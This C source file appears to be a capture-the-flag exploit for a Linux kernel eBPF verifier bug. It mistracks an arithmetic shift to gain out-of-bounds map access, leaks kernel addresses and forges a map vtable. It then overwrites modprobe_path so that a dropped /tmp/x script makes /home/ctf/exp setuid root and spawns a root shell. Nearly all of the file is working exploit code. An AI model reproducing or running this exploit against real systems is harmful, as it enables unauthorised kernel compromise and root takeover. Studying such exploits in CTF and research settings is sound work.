#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/bpf.h>
#include <sys/socket.h>
#include "bpf_insn.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int bpf(int cmd, union bpf_attr *attr){
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

int bpf_prog_load(union bpf_attr *attr){
    return bpf(BPF_PROG_LOAD, attr);
}

int bpf_map_create(uint32_t key_size, uint32_t value_size, uint32_t max_entries){
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };

    return bpf(BPF_MAP_CREATE, &attr);
}

int bpf_map_update_elem(int map_fd, uint64_t key, uint64_t* value, uint64_t flags){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) value,
        .flags = flags
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

uint64_t bpf_map_lookup_elem(int map_fd, uint32_t key, int index){
    uint64_t value[0x150/8] = {};

    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) &value,
    };

    bpf(BPF_MAP_LOOKUP_ELEM, &attr);
    return value[index];
}

uint64_t bpf_map_lookup_key(int map_fd, uint32_t key, void *value){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) value,
    };

    return bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

uint64_t bpf_map_update_key(int map_fd, uint32_t key, void *value, uint64_t flags){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) value,
        .flags = flags
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

uint64_t bpf_map_push(int map_fd, void *value, uint64_t flags){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = 0,
        .value = (uint64_t) value,
        .flags = flags
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

union bpf_attr* create_bpf_prog(struct bpf_insn *insns, unsigned int insn_cnt){
    union bpf_attr *attr = (union bpf_attr *) malloc(sizeof(union bpf_attr));

    attr->prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr->insn_cnt = insn_cnt;
    attr->insns = (uint64_t) insns;
    attr->license = (uint64_t)"";

    return attr;
}

int socks[2] = {-1};

int attach_socket(int prog_fd){
    if(socks[0] == -1 && socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0){
        perror("socketpair");
        exit(1);
    }
    
    if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0){
        perror("setsockopt");
        exit(1);
    }
}

void setup_bpf_prog(struct bpf_insn *insns, size_t insncnt){
    union bpf_attr *prog = create_bpf_prog(insns, insncnt);
    int prog_fd = bpf_prog_load(prog);

    if(prog_fd < 0){
        perror("prog_load");
        exit(1);
    }

    attach_socket(prog_fd);
}



void run_bpf_prog(struct bpf_insn *insns, size_t insncnt){
    int val = 0;

    setup_bpf_prog(insns, insncnt);
    write(socks[1], &val, sizeof(val));
}

void write_file(char* filename, char* content) {
    int fd = open(filename, O_RDWR|O_CREAT);
    if(fd<0) {
        fprintf(stderr, "invalid open\n");
        return;
    }
    write(fd, content, strlen(content));
    close(fd);
    return;
}

int main(){
    setuid(0);
    if(getuid() == 0) {
        system("/bin/sh");
    }

    // all alloced in kmalloc-4096 which is not noisy at all
    int oob_map = bpf_map_create(4, 0x150, 1);
    int victim_map = bpf_map_create(4, 8, 0x150/8);
    int exp_map = bpf_map_create(4, 8, 0x150/8);

    if(oob_map < 0){
        perror("create_map");
        return 1;
    }
    size_t val = 1;
    bpf_map_update_elem(oob_map, 0, &val, BPF_ANY);
    printf("Test: %p\n", bpf_map_lookup_elem(oob_map, 0, 0));

    size_t test = 0;
    memcpy(&test, "\x60\x61\x62\x63\x64\x65\x66\x67", 8);

    struct bpf_insn kleak_prog[] = {
        // load map_ptr_or_null in BPF_REG_0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_1, test),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map)

        // map_ptr_or_null -> map_ptr
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_7, 0),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 1),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_ALU64_REG(BPF_ARSH, BPF_REG_0, BPF_REG_8), // the bug verifier thinks REG_0 is 1 while is 0
        BPF_MOV64_IMM(BPF_REG_9, 1),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_0), // verifier thinks REG_9 is 0 while is 1
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_9, 0xc9),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_9),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_9),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_9),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_1, 0xffffffff), // write to victim map max_entries
        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_1, 0),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_9),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 7),
        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_1, 0), // write to victim map index_mask

        BPF_EXIT_INSN(),
    };
    run_bpf_prog(kleak_prog, sizeof(kleak_prog)/sizeof(kleak_prog[0]));
    uint64_t array_map_ops = 0;
    uint64_t map_ptr = 0;
    printf("lookup1: %p\n", bpf_map_lookup_key(victim_map, 0x308/8, &array_map_ops));
    printf("lookup2: %p\n", bpf_map_lookup_key(victim_map, (0x308 + 0x70)/8, &map_ptr));

    printf("kptr: %p\n", array_map_ops);
    printf("heap: %p\n", map_ptr);

    size_t fake_vtable[] = {
    0xffffffff865d39d0ULL, 0xffffffff865d4ca0ULL,
    0x0000000000000000ULL, 0xffffffff865d52c0ULL,
    0xffffffff865d3b40ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0xffffffff86597020ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0xffffffff86596df0ULL, 0x0000000000000000ULL,
    0xffffffff865d3df0ULL, 0xffffffff865d5760ULL,
    0xffffffff865d3b90ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0xffffffff865d3da0ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0xffffffff865d4520ULL,
    0x0000000000000000ULL, 0xffffffff865d4430ULL,
    0xffffffff865d50a0ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0x0000000000000000ULL, 0xffffffff865d8d30ULL,
    0xffffffff865be490ULL, 0xffffffff865d3f60ULL,
    0xffffffff865d3e30ULL, 0xffffffff877e1b60ULL,
    0xffffffff8701db00ULL
    };
    fake_vtable[15] = 0xffffffff865d3b40ULL;

    for (int i = 0; i < sizeof(fake_vtable)/sizeof(fake_vtable[0]); i++){
        fake_vtable[i] += array_map_ops - 0xffffffff8701d9a0UL;
        bpf_map_update_key(victim_map, i, &fake_vtable[i], BPF_ANY);
    }
    val = 1UL<<32;
    bpf_map_update_key(exp_map, 0, &val, BPF_ANY);

    val = map_ptr - 0x70 - 0x400 + 0xf8;
    bpf_map_update_key(victim_map, 0x308/8, &val, BPF_ANY);
    val = 0xffffffff00000008;
    bpf_map_update_key(victim_map, (0x308 + 0x18)/8, &val, BPF_ANY);
    val = BPF_MAP_TYPE_STACK | 4UL<<32;
    bpf_map_update_key(victim_map, (0x308 + 0x10)/8, &val, BPF_ANY);
    val = map_ptr - 0x70 + 0xf8;
    bpf_map_update_key(victim_map, (0x308 + 0x30)/8, &val, BPF_ANY);

    size_t modprobe_addr = array_map_ops + 0xffffffff874be1e0UL - 0xffffffff8701d9a0UL;
    char *target = "/tmp/x";
    val = *(int *)(&target[0]) - 1;
    printf("push: %p\n", bpf_map_update_key(exp_map, 0, &val, modprobe_addr));
    
    val = *(int *)(&target[4]) - 1;
    printf("push: %p\n", bpf_map_update_key(exp_map, 0,&val, modprobe_addr+4));

    write_file("/tmp/x", "#!/bin/sh\n/bin/chown root:root /home/ctf/exp\n/bin/chmod u+s /home/ctf/exp");
    system("chmod 755 /tmp/x");
    close(socket(AF_INET, SOCK_STREAM, 255));
    system("/home/ctf/exp");
}